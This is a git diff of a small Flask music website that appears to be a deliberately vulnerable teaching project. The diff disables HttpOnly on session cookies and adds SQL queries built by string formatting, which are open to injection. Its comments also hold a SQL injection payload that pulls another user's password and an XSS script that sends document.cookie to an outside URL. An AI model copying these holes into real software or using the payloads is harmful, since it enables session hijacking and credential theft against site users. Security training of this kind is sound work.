@@ -1,12 +1,15 @@
 from musik import app, db
 from flask import render_template, request, flash, url_for, redirect,make_response,session
 from sqlalchemy import text
-
+app.config['SESSION_COOKIE_HTTPONLY'] = False
 @app.route('/')
 def home_page():
     userid = session.get('user')
+    query_stmt = f"select username from user where id = '{userid}'"
+    result = db.session.execute(text(query_stmt))
+    username = result.fetchall()
     if (session.get('user') != None):
-        return render_template('home.html',name = userid,loged_in = True)
+        return render_template('home.html',name = username[0][0],loged_in = True)
     return render_template('home.html', loged_in = False)
 
 @app.route('/login', methods=['GET', 'POST'])
@@ -44,7 +47,7 @@ def login_pages():
             # print("debug2")
             return render_template('login.html')
         # print("debug3")
-        flash(f"'{user[0]}', you are logged in ", category='success')
+        flash(f"{user[0][0]}, you are logged in ", category='success')
         # print("debug4")
         query_stmt = f"select id from user where username = '{username}'"
         result = db.session.execute(text(query_stmt))
@@ -140,6 +143,7 @@ def add_artists_page():
         description = request.form.get('Description')
         print(name,image,description)
         query_insert = f"insert into artists (name, picture, infoText) values ('{name}', '{image}', '{description}');"# user3',(select username from user where id = 3),(select password from user where id = 3)); --
+        # xss cookie kalu : <script>document.write("<img src=\'[URL]?c="+document.cookie+"\' />"); </script>
         print(query_insert)
         db.session.execute(text(query_insert))
         db.session.commit()
